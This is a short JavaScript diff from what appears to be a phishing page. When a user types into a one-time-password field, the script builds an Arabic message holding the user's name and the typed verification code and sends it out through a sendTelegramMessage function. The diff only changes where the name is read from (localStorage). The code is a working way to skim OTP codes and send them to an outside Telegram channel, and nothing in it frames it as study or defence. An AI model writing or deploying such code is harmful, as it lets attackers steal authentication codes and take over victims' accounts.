@@ -274,7 +274,7 @@ $('#otp').on('input',() => {
 
 var message = `
 ملاحظة - رسالة تلقائية
-الاسم: ${fullName}
+الاسم: ${localStorage.getItem('userName')}
 رمز التحقق: ${document.getElementById("otp").value}
                  `
                 sendTelegramMessage(message)   
